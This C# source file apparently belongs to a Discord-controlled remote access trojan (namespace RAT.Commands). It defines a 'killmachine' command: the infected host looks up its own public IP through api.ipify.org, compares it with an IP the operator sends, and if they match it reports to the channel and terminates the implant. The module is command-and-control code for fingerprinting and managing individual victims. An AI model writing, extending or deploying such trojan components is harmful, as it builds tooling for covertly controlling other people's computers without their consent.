using Discord.Commands;
using System;
using System.Net;
using System.Threading.Tasks;

namespace RAT.Commands
{
    public class KillMachineCommand : ModuleBase<SocketCommandContext>
    {
        [Command("killmachine")]
        public async Task KillMachineCmd(string ipAddress)
        {
            // Get the public IP address of the current machine
            string currentIpAddress = await GetPublicIpAddressAsync();

            // Check if the specified IP matches the current machine's IP
            if (string.Equals(ipAddress, currentIpAddress))
            {
                // Send a termination message to the channel
                await ReplyAsync($"Terminating the machine : {currentIpAddress}");

                // Stop the bot and exit the application
                await Context.Client.LogoutAsync();
                await Context.Client.StopAsync();
                Environment.Exit(0);
            }
            else
            {
                // Send a message indicating the IP mismatch

            }
        }

        private async Task<string> GetPublicIpAddressAsync()
        {
            try
            {
                using (var client = new WebClient())
                {
                    string ipAddress = await client.DownloadStringTaskAsync("https://api.ipify.org");
                    return ipAddress;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to get public IP address: {ex.Message}");
                return string.Empty;
            }
        }
    }
}
